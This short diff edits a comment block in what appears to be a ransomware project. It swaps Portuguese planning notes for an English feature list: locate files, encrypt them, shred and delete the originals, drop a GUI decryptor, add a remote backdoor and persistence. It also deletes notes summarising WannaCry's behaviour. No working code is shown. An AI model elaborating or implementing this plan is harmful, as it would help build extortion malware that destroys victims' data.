@@ -8,28 +8,17 @@
 
 /*
   
-  Procurar pelos arquivos, 
-  criptografar arquivos - criando o novo arquivo
-  shred arquivo antigo
-  depois um certo tempo, excluir os arquivos antigos
-  criar um decryptor com GUI
-
-
-  criar daemon para procurar por novos arquivos e USB's
-  
+  search for files, 
+  create new encrypted file
+  shred old file (without deleting it)
+  after shreding all files, delete all files
+  drop decryptor with GUI
   remote backdoor
+ * 
+ * deal with process and interruptions
+ * create new process and persistence ransomware
 */
 
-/*
-  WannaCry
-  cria vários arquivos extras, README em cada pasta, private key, public key
-  criptografa os arquivos antigos, criando novo arquivo
-  shred arquivos antigos
-  sleep(60)
-  delete arquivos antigos
-
-
-*/
 
 
 
